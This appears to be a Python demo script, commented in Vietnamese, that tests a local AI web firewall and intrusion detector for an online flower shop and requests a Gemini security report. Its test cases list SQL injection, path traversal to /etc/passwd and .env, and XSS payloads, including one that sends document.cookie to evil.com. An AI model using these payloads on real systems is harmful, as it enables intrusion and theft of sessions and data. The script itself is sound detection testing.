#!/usr/bin/env python3
# =============================================================================
#  DEMO SCRIPT - RoseShop Security AI Engine Attack Simulator
#  Mô phỏng các cuộc tấn công thực tế và xem phản hồi từ hệ thống AI
#  Chạy: py demo_attack.py
# =============================================================================

import sys
import io
import os

# Fix Unicode encoding cho Windows terminal
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    os.environ["PYTHONIOENCODING"] = "utf-8"

import requests
import json
import time
from datetime import datetime

AI_SERVICE_URL = "http://127.0.0.1:5000"

# ──────────────────────────────────────────────────────────────────────────────
#  ANSI Color Codes
# ──────────────────────────────────────────────────────────────────────────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def banner():
    print()
    print(RED + BOLD + "=" * 78 + RESET)
    print(RED + BOLD + "  [ROSESHOP] SECURITY AI ENGINE - ATTACK DEMO SIMULATOR" + RESET)
    print(RED + BOLD + "  He thong AI WAF + IPS Demo & Test Tool" + RESET)
    print(RED + BOLD + "=" * 78 + RESET)
    print()

def check_ai_service():
    """Kiểm tra AI service đang chạy không"""
    try:
        r = requests.get(f"{AI_SERVICE_URL}/docs", timeout=3)
        print(f"{GREEN}✅ AI Service (FastAPI) đang ONLINE tại {AI_SERVICE_URL}{RESET}")
        return True
    except:
        print(f"{RED}❌ AI Service OFFLINE! Hãy chạy: uvicorn app:app --port 5000{RESET}")
        return False

def severity_color(severity: str) -> str:
    colors = {
        "CRITICAL": f"{RED}{BOLD}🔴 CRITICAL{RESET}",
        "HIGH":     f"{RED}🟠 HIGH{RESET}",
        "MEDIUM":   f"{YELLOW}🟡 MEDIUM{RESET}",
        "LOW":      f"{GREEN}🟢 LOW{RESET}",
    }
    return colors.get(severity, severity)

def attack_result_display(payload: str, result: dict, expected_type: str):
    """Hiển thị kết quả phân tích tấn công đẹp"""
    is_attack = result.get("is_attack", False)
    confidence = result.get("confidence", 0)
    attack_type = result.get("attack_type", "None")
    score = int(confidence * 100)

    status_icon = f"{RED}🚨 TẤN CÔNG PHÁT HIỆN{RESET}" if is_attack else f"{GREEN}✅ AN TOÀN{RESET}"
    blocked = "CHẶN + KHÓA IP" if score >= 58 and is_attack else ("GHI LOG" if is_attack else "CHO QUA")
    action_color = RED if score >= 58 and is_attack else (YELLOW if is_attack else GREEN)

    print(f"  {CYAN}Payload:{RESET} {WHITE}{repr(payload[:80])}{RESET}")
    print(f"  {CYAN}Kết quả:{RESET} {status_icon}")
    print(f"  {CYAN}Loại:{RESET}    {MAGENTA}{attack_type}{RESET}  |  {CYAN}Tin cậy:{RESET} {score}%  |  {CYAN}Hành động:{RESET} {action_color}{blocked}{RESET}")

def section(title: str):
    print(f"\n{BLUE}{BOLD}{'═'*76}{RESET}")
    print(f"{BLUE}{BOLD}  {title}{RESET}")
    print(f"{BLUE}{BOLD}{'═'*76}{RESET}\n")

# ──────────────────────────────────────────────────────────────────────────────
#  MODULE 1: WAF Payload Analysis Demo
# ──────────────────────────────────────────────────────────────────────────────
def demo_waf_attacks():
    section("🛡️  MODULE 1: AI WAF - Phân tích Payload Tấn Công")

    test_cases = [
        # ─── SQL INJECTION ───────────────────────────────────────────────────
        {"group": "SQL Injection", "payload": "' OR '1'='1", "expected": "SQLi"},
        {"group": "SQL Injection", "payload": "1 UNION SELECT username, password FROM nguoi_dung --", "expected": "SQLi"},
        {"group": "SQL Injection", "payload": "admin' AND 1=1 --", "expected": "SQLi"},
        {"group": "SQL Injection", "payload": "'; DROP TABLE nguoi_dung; --", "expected": "SQLi"},

        # ─── XSS ─────────────────────────────────────────────────────────────
        {"group": "Cross-Site Scripting (XSS)", "payload": "<script>alert(document.cookie)</script>", "expected": "XSS"},
        {"group": "Cross-Site Scripting (XSS)", "payload": "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>", "expected": "XSS"},
        {"group": "Cross-Site Scripting (XSS)", "payload": "javascript:alert('XSS via href')", "expected": "XSS"},

        # ─── PATH TRAVERSAL ───────────────────────────────────────────────────
        {"group": "Path Traversal", "payload": "../../../../etc/passwd", "expected": "Path_Traversal"},
        {"group": "Path Traversal", "payload": "..\\..\\..\\windows\\win.ini", "expected": "Path_Traversal"},
        {"group": "Path Traversal", "payload": "../../.env", "expected": "Path_Traversal"},

        # ─── BENIGN (An toàn) ─────────────────────────────────────────────────
        {"group": "✅ Lưu lượng BÌNH THƯỜNG (nên qua lọc)", "payload": "hoa hong do dep nhat Ha Noi", "expected": "None"},
        {"group": "✅ Lưu lượng BÌNH THƯỜNG (nên qua lọc)", "payload": "Nguyen Van A - 0987654321 - Cau Giay", "expected": "None"},
    ]

    current_group = ""
    stats = {"attack_detected": 0, "safe_pass": 0, "false_positive": 0}

    for tc in test_cases:
        if tc["group"] != current_group:
            current_group = tc["group"]
            print(f"\n  {YELLOW}── {current_group} ──{RESET}")

        try:
            resp = requests.post(
                f"{AI_SERVICE_URL}/analyze-payload",
                json={"text": tc["payload"]},
                timeout=5
            )
            result = resp.json()
            attack_result_display(tc["payload"], result, tc["expected"])

            if result["is_attack"] and tc["expected"] != "None":
                stats["attack_detected"] += 1
            elif not result["is_attack"] and tc["expected"] == "None":
                stats["safe_pass"] += 1
            elif result["is_attack"] and tc["expected"] == "None":
                stats["false_positive"] += 1

        except Exception as e:
            print(f"  {RED}❌ Lỗi kết nối AI Service: {e}{RESET}")
        print()
        time.sleep(0.1)

    print(f"\n  {BOLD}📊 Thống kê WAF Module:{RESET}")
    print(f"  ✅ Tấn công phát hiện đúng: {GREEN}{stats['attack_detected']}{RESET}")
    print(f"  ✅ Lưu lượng an toàn qua đúng: {GREEN}{stats['safe_pass']}{RESET}")
    print(f"  ⚠️  False Positive (nhầm): {YELLOW}{stats['false_positive']}{RESET}")

# ──────────────────────────────────────────────────────────────────────────────
#  MODULE 2: Anomaly / IPS Detection Demo
# ──────────────────────────────────────────────────────────────────────────────
def demo_ips_anomaly():
    section("🔍  MODULE 2: Smart IPS - Phát hiện Bất thường & Bot")

    scenarios = [
        {
            "name": "👤 Người dùng bình thường",
            "ip": "203.99.10.1",
            "request_count": 15,
            "failed_logins": 0,
            "has_bad_extensions": False,
        },
        {
            "name": "⚠️  Tấn công Brute-Force đăng nhập (4 lần sai)",
            "ip": "103.45.22.88",
            "request_count": 30,
            "failed_logins": 4,
            "has_bad_extensions": False,
        },
        {
            "name": "🚨 Tấn công Brute-Force nghiêm trọng (6 lần sai liên tiếp)",
            "ip": "185.220.101.50",
            "request_count": 50,
            "failed_logins": 6,
            "has_bad_extensions": False,
        },
        {
            "name": "💥 Tấn công DOS - Tần suất yêu cầu cực cao",
            "ip": "45.152.66.35",
            "request_count": 90,
            "failed_logins": 0,
            "has_bad_extensions": False,
        },
        {
            "name": "🔴 Upload File Nguy Hại (.php shell / .exe)",
            "ip": "92.118.160.25",
            "request_count": 5,
            "failed_logins": 1,
            "has_bad_extensions": True,
        },
    ]

    for s in scenarios:
        print(f"  {BOLD}{s['name']}{RESET}")
        print(f"  IP: {CYAN}{s['ip']}{RESET} | Requests: {s['request_count']}/min | Failed Logins: {s['failed_logins']}")

        try:
            resp = requests.post(
                f"{AI_SERVICE_URL}/detect-anomaly",
                json={
                    "ip": s["ip"],
                    "request_count": s["request_count"],
                    "failed_logins": s["failed_logins"],
                    "has_bad_extensions": s["has_bad_extensions"],
                },
                timeout=5
            )
            result = resp.json()
            score = result.get("threat_score", 0)
            action = result.get("action_taken", "")
            sev = result.get("severity", "LOW")

            action_colors = {
                "LOG_ONLY": GREEN,
                "BLOCKED_IP": YELLOW,
                "LOCKED_ACCOUNT": RED,
            }
            ac = action_colors.get(action, WHITE)

            print(f"  🎯 Threat Score: {BOLD}{score}/100{RESET}  |  Severity: {severity_color(sev)}  |  Action: {ac}{BOLD}{action}{RESET}")

        except Exception as e:
            print(f"  {RED}❌ Lỗi: {e}{RESET}")

        print()
        time.sleep(0.2)

# ──────────────────────────────────────────────────────────────────────────────
#  MODULE 3: AI Report Generation (Gemini)
# ──────────────────────────────────────────────────────────────────────────────
def demo_ai_report():
    section("🤖  MODULE 3: Gemini AI - Tạo Báo cáo An ninh Tự động")

    print(f"  {CYAN}Đang gọi Gemini AI để tạo báo cáo bảo mật...{RESET}")
    print(f"  {YELLOW}(Có thể mất 15-30 giây để Gemini xử lý){RESET}\n")

    # Tạo dữ liệu log mô phỏng
    fake_logs = [
        {"ip_address": "185.220.101.50", "attack_type": "SQLi",        "severity": "HIGH",     "payload": "' OR 1=1 --",                         "action_taken": "PENDING_MODERATION", "created_at": "2026-06-10 02:14:35"},
        {"ip_address": "185.220.101.50", "attack_type": "SQLi",        "severity": "HIGH",     "payload": "UNION SELECT password FROM nguoi_dung","action_taken": "PENDING_MODERATION", "created_at": "2026-06-10 02:15:10"},
        {"ip_address": "45.152.66.35",   "attack_type": "DOS",         "severity": "HIGH",     "payload": "95 req/min từ IP này",                 "action_taken": "BLOCKED_IP",         "created_at": "2026-06-11 14:03:00"},
        {"ip_address": "92.118.160.25",  "attack_type": "Malicious_Upload","severity": "CRITICAL","payload": "shell.php inside image.jpg",        "action_taken": "LOCKED_ACCOUNT",     "created_at": "2026-06-11 23:55:12"},
        {"ip_address": "103.45.22.88",   "attack_type": "XSS",         "severity": "MEDIUM",   "payload": "<script>alert(document.cookie)</script>","action_taken": "LOG_ONLY",         "created_at": "2026-06-12 09:30:00"},
        {"ip_address": "203.99.10.1",    "attack_type": "SQLi",        "severity": "LOW",      "payload": "SELECT id FROM test",                  "action_taken": "LOG_ONLY",           "created_at": "2026-06-12 11:00:00"},
        {"ip_address": "185.220.101.50", "attack_type": "Path_Traversal","severity": "HIGH",   "payload": "../../../../etc/passwd",               "action_taken": "PENDING_MODERATION", "created_at": "2026-06-13 00:10:00"},
        {"ip_address": "45.152.66.35",   "attack_type": "DOS",         "severity": "HIGH",     "payload": "120 req/min - flood attack",           "action_taken": "BLOCKED_IP",         "created_at": "2026-06-13 08:00:00"},
        {"ip_address": "92.118.160.25",  "attack_type": "Malicious_Upload","severity": "CRITICAL","payload": "webshell.phar disguised as flower.jpg","action_taken": "LOCKED_ACCOUNT",  "created_at": "2026-06-13 12:44:00"},
        {"ip_address": "103.45.22.88",   "attack_type": "XSS",         "severity": "MEDIUM",   "payload": "<img src=x onerror=fetch(evil.com)>",   "action_taken": "LOG_ONLY",          "created_at": "2026-06-13 13:00:00"},
    ]

    try:
        resp = requests.post(
            f"{AI_SERVICE_URL}/generate-report",
            json={
                "start_date": "2026-06-10",
                "end_date":   "2026-06-13",
                "logs":       fake_logs,
            },
            timeout=60
        )

        if resp.status_code == 200:
            data = resp.json()
            total = data.get("total_attacks", 0)
            critical = data.get("critical_events", 0)
            report = data.get("summary", "")

            print(f"  {GREEN}✅ Báo cáo từ Gemini AI tạo thành công!{RESET}")
            print(f"  📊 Tổng sự kiện: {BOLD}{total}{RESET} | 🔴 High/Critical: {RED}{BOLD}{critical}{RESET}\n")
            print(f"{CYAN}{'─'*76}{RESET}")
            print(report)
            print(f"{CYAN}{'─'*76}{RESET}")

        else:
            error = resp.json().get("detail", resp.text)
            print(f"  {RED}❌ Lỗi từ AI Service: {error}{RESET}")

    except requests.exceptions.Timeout:
        print(f"  {YELLOW}⏳ Gemini đang xử lý nhưng quá lâu (timeout 60s). Thử lại sau.{RESET}")
    except Exception as e:
        print(f"  {RED}❌ Lỗi kết nối: {e}{RESET}")

# ──────────────────────────────────────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main():
    banner()
    print(f"  {WHITE}Thời gian chạy: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}\n")

    if not check_ai_service():
        print(f"\n{YELLOW}💡 Hướng dẫn khởi động AI Service:{RESET}")
        print(f"  1. cd ai-service")
        print(f"  2. pip install -r requirements.txt")
        print(f"  3. python train.py          (Train WAF model)")
        print(f"  4. uvicorn app:app --port 5000 --reload")
        print(f"\nSau đó chạy lại: python demo_attack.py\n")
        return

    print(f"\n{BOLD}Chọn Module Demo:{RESET}")
    print(f"  {CYAN}1{RESET} - Module 1: AI WAF Payload Analyzer (SQLi, XSS, Path Traversal)")
    print(f"  {CYAN}2{RESET} - Module 2: Smart IPS Anomaly Detector (DOS, Brute-Force, File Upload)")
    print(f"  {CYAN}3{RESET} - Module 3: Gemini AI Security Report Generator")
    print(f"  {CYAN}0{RESET} - Chạy TẤT CẢ module")
    print()

    choice = input(f"{BOLD}Nhập lựa chọn (0/1/2/3): {RESET}").strip()

    if choice == "1":
        demo_waf_attacks()
    elif choice == "2":
        demo_ips_anomaly()
    elif choice == "3":
        demo_ai_report()
    elif choice == "0":
        demo_waf_attacks()
        demo_ips_anomaly()
        demo_ai_report()
    else:
        print(f"{YELLOW}Lựa chọn không hợp lệ. Chạy tất cả...{RESET}")
        demo_waf_attacks()
        demo_ips_anomaly()
        demo_ai_report()

    print(f"\n{GREEN}{BOLD}{'═'*76}")
    print(f"  ✅ DEMO HOÀN TẤT - RoseShop Security AI Engine")
    print(f"{'═'*76}{RESET}\n")

if __name__ == "__main__":
    main()
